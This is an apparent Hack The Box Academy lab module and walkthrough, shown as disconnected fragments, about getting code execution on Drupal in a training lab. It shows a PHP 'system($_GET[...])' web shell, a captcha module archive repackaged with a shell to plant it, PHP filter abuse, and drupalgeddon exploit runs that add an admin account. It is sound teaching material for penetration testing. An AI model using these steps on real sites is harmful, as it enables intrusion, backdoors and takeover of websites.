...
![Drupal modules page with PHP filter module highlighted, allowing embedded PHP code to be evaluated.](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)
...
![Drupal add content page with Basic page option highlighted for static content like 'About us' pages.](https://academy.hackthebox.com/storage/modules/113/basic_page.png)
...
![Drupal create basic page interface with PHP code input, highlighting text format set to PHP code.](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
...
```shell-session
xF1NN@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
...
![Drupal install page with options to install modules or themes from a URL or upload an archive file.](https://academy.hackthebox.com/storage/modules/113/install_module.png)
...
```shell-session
xF1NN@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
xF1NN@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
...
```shell-session
xF1NN@htb[/htb]$ mv shell.php .htaccess captcha
xF1NN@htb[/htb]$ tar cvf captcha.tar.gz captcha/
...
![Inlanefreight Blog update manager showing successful installation of captcha and next steps for module management.](https://academy.hackthebox.com/storage/modules/113/module_installed.png)
...
```shell-session
xF1NN@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
```shell-session
xF1NN@htb[/htb]$ python2.7 drupalgeddon.py 
...
```shell-session
xF1NN@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
...
![Drupal user management page showing filters for role, permission, and status, with users admin and hacker listed as active administrators.](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)
...
```shell-session
xF1NN@htb[/htb]$ python3 drupalgeddon2.py 
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
...
```shell-session
xF1NN@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
...
```shell-session
xF1NN@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
![HTTP request details showing headers like User-Agent, Accept, and Cookie for drupal-acc.inlanefreight.local.](https://academy.hackthebox.com/storage/modules/113/burp.png)
...
![Attacking_Common_Applications_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_16.png)

Subsequently, students need to click on "Extend", scroll down until they find the "PHP Filter" module, and then check it:

![Attacking_Common_Applications_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_17.png)

![Attacking_Common_Applications_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_18.png)

![Attacking_Common_Applications_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_19.png)

Students then need to click on "Content" and click on "Add Content":

![Attacking_Common_Applications_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_20.png)

Then, students need to click on "Basic page":

![Attacking_Common_Applications_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_21.png)
...
![Attacking_Common_Applications_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_22.png)
